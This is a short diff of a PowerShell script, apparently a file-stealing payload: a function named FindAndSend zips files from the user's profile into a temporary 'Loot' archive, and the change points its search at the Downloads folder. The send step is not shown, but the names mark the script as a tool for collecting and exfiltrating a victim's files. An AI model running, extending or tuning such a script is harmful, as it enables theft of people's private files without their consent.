@@ -29,6 +29,7 @@ Function FindAndSend {
     $zipFilePath ="$env:temp\Loot$index.zip"
 
     # Thiết lập thư mục tìm kiếm
+    $Path = "Downloads"
     if($Path -ne $null){
         $foldersToSearch = "$env:USERPROFILE\$Path"
     } else {
